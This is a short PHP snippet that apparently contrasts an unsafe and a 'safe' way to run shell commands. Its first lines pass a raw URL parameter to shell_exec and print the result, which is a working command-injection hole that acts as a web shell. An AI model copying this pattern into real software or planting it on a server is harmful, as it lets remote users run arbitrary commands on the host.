<?php
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);
echo $output;

// Safe version
$safe_cmd = escapeshellarg($_GET['safe_cmd']);
$safe_output = shell_exec('echo ' . $safe_cmd);
echo $safe_output;
?>
